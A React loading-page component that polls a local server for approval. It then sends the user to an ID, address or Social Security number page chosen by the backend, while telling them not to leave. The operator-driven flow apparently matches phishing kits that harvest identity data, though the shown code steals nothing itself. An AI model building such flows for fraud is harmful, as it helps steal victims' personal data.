import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';

function LoadingPage() {
  const [approved, setApproved] = useState(false);
  const [choice, setChoice] = useState('');
  const navigate = useNavigate();

  useEffect(() => {
    const interval = setInterval(async () =>{
      try {
        const response = await axios.get('http://localhost:1000/check-approval');
        if (response.data.approved) {
          setApproved(true);
          setChoice(response.data.choice);
          clearInterval(interval);
        }
      } catch (error) {
        console.error('Error checking aprroval', error);
      }
    }, 3000);

    return () => clearInterval(interval);
  }, []);

  useEffect(() =>{
    if(approved) {
      if(choice === 'id-page'){
        navigate('/identity=type');
      } else if(choice === 'address-page'){
        navigate('/address');
      } else if(choice === 'ssn'){
        navigate('/ssn');
      }
    }
  }, [approved, choice, navigate]);

  return (
    <div className="container-loading-page">
      <div className="loading-page-box">
        <div className="loading-icon-container">
          <div className="loading-icon"></div>
          <div className="loading-icon"></div>
          <div className="loading-icon"></div>
        </div>
        <div className="loading-text-1">Please Wait</div>
        <div className="loading-text-2">Please allow us some time to verify your information</div>
        <div className="loading-text-3">Do not refresh, close or navigate away from this page</div>
      </div>
    </div>
  );
}

export default LoadingPage;
